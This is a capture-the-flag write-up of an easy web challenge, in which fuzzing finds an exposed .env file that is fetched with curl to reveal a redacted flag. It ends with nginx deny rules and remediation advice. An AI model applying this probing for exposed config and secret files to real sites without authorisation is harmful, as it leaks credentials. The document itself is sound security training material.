# sensitivity — PentestGarage

- **Category:** Web Security
- **Difficulty:** Easy (100 pts)
- **Date solved:** 2026-08-10
- **Target:** `ctf-gokulpg-sensitivity-52f4e143.challenges.pentestgarage.com:80`

## Challenge
> Not everything should be publicly visible. Inspect the application carefully
> for accidentally exposed files, backups, or configuration data.

## Recon
- Root `/` returns HTTP 200 — a static template site titled **"settle"**, served by **nginx/1.25.1** (`Last-Modified: Jul 2023`).
- `robots.txt` → 404. No `.git/`, no `.htaccess`, no backup archives.
- Fuzzed a wordlist of common exposed/backup/config files. Only hit:
  - `GET /.env` → **HTTP 200**, 43 bytes.

## Exploitation
```bash
curl -s http://ctf-gokulpg-sensitivity-52f4e143.challenges.pentestgarage.com/.env
```
```
FLAG=ctf{__redacted__}
```

An environment/config file was left in the web root and served directly by nginx.

## Flag
```
ctf{__redacted__}
```

## Takeaways / remediation
- `.env` and other dotfiles/config/backups must never sit under the web root.
- nginx should deny hidden/sensitive files, e.g.:
  ```nginx
  location ~ /\.(?!well-known) { deny all; }
  location ~* \.(env|bak|sql|zip|tar\.gz|swp)$ { deny all; }
  ```
- Secrets belong in the app environment (systemd, container env, secrets manager), not a file in `webroot`.
